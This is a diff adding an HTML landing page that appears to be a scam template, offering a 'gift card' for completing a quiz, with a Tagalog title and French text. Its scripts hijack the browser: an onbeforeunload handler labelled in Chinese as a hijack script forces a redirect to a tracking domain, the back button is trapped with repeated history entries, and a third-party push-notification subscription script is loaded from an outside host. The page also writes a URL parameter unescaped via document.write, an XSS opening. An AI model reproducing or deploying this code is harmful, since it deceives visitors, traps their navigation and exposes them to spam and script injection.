@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="pushsdk" content="74b464bda8feaa68475ab3ad874de656">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Kumpletuhin ang pagsubok !</title>
+	<link rel="stylesheet" href="style.css">
+	<script>
+	function getURLParameter(name) {
+		return decodeURIComponent(
+			(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''   /*登陆页面脚本*/
+		); 
+	}
+	</script>
+</head>
+<body>
+
+	<div class="main">
+		
+		<h1>Terminez le test dans le prochain <span class="timer" id="timer"></span> secondes</h1>
+
+		<p><img src="gift_card.jpg" class="image"></p>
+
+		<h2>et voyez si vous gagnez une CARTE CADEAU !</h2>
+
+		<p class="text-left list-text">
+			1. Répondez à quelques questions simples<br>
+			2. Vous verrez vos résultats immédiatement<br>
+			3. Vérifiez si vous avez gagné une CARTE CADEAU !
+		</p>
+		<p><a href="YOUR_CLICK_URL_HERE" class="cta-button">PLAY NOW!</a></p>
+		<p>vous habitez dans la ville de <script>document.write(getURLParameter('city'))</script></p>
+		<button onclick="go();">CLIQUEZ MOI</button>
+	</div>
+	
+
+
+	<script src="jquery-3.6.0.min.js"></script>
+	<script src="main.js"></script>
+
+	<script type="text/javascript">
+		setTimeout(function (){ alert('Pansin!'); }, 500); 
+	</script>
+
+	<script>
+		var redirecting = false;
+		
+		window.onbeforeunload = function() {
+		
+			if (redirecting) return;
+		
+			setTimeout(function() {
+		
+				window.top.location.href = 'https://o35pg.bemobtrcks.com/click';		/*绑架脚本*/
+		
+				setTimeout(function() {
+					redirecting = true;
+				}, 1000);
+		
+		
+			}, 1);
+		
+		};
+	</script>
+	<script>
+			function go() {
+				window.onbeforeunload = null;
+				window.location = 'https://o35pg.bemobtrcks.com/click';	/*触发的 CTA 按钮*/
+			}
+	</script>
+	<script>
+			function getURLParameter(name) {
+				return decodeURIComponent(
+					(RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [,
+						null
+					])[1] || ""
+				);
+			}
+	</script>
+	<script>
+		var camp_id = getURLParameter("campaign_id");
+		var lp_name = getURLParameter("landing_page_title");
+		console.log(
+			`The campaign ID is: ${
+				camp_id || null
+				} and the landing page is called ${lp_name || null}.`
+		);
+	</script>
+	<script>
+		var back_url = `https://o35pg.bemobtrcks.com/click`;
+		console.log(`The back button URL is now: ${back_url}`);
+		!(function() {
+			var t;
+			try {
+				const URL = window.location.href.split(/[#]/)[0];
+				for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");
+				onpopstate = function(event) {
+					event.state && location.replace(back_url);
+				};
+			} catch (o) {
+				console.log(o);
+			}
+		})();
+	</script>
+	<script>
+		var s = document.createElement('script');
+		s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5946956'+'&sw=/sw-check-permissions-a7046.js';
+		s.onload = function(result) {
+			switch (result) {
+				case 'onPermissionDefault':break;
+				case 'onPermissionAllowed':break;
+				case 'onPermissionDenied':break;
+				case 'onAlreadySubscribed':break;
+				case 'onNotificationUnsupported':break;
+			}
+		}
+		document.head.appendChild(s);
+	</script>
+	
+</body>
+</html>
